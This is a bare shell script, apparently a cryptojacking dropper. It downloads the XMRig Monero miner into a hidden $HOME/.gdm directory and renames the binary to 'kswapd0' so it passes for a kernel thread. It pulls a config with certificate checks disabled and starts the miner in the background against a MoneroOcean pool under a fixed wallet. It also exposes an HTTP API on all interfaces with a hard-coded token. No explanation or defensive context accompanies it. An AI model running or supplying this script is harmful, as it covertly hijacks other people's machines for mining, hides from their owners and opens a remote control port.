mkdir $HOME/.gdm/
cd $HOME/.gdm/
wget https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz -O $HOME/.gdm/xmrig-6.21.3-linux-static-x64.tar.gz
tar xzvf xmrig-6.21.3-linux-static-x64.tar.gz -C $HOME/.gdm/
mv $HOME/.gdm/xmrig-6.21.3/xmrig $HOME/.gdm/kswapd0
chmod +x $HOME/.gdm/kswapd0
wget --no-check-certificate https://github.com/jrpm98/moneroocean-setup/raw/main/config_background.json -O $HOME/.gdm/config.json
cp $HOME/.gdm/config.json $HOME/.gdm/config_background.json
sed -i 's/"background": *false,/"background": true,/' $HOME/.gdm/config_background.json
$HOME/.gdm/kswapd0 -B --http-host 0.0.0.0 --http-port 8181 --http-access-token 55maui55 -o gulf.moneroocean.stream:80 -u 4AG114wroAMFXbLyK65UbXBoYKhx3QeY8NTpEYZuf3WPCLFg5nL3TBZ8SQZ5RcmBfxfmoxoNWN81NaqnW6supV3oAm21WTD -k --nicehash &
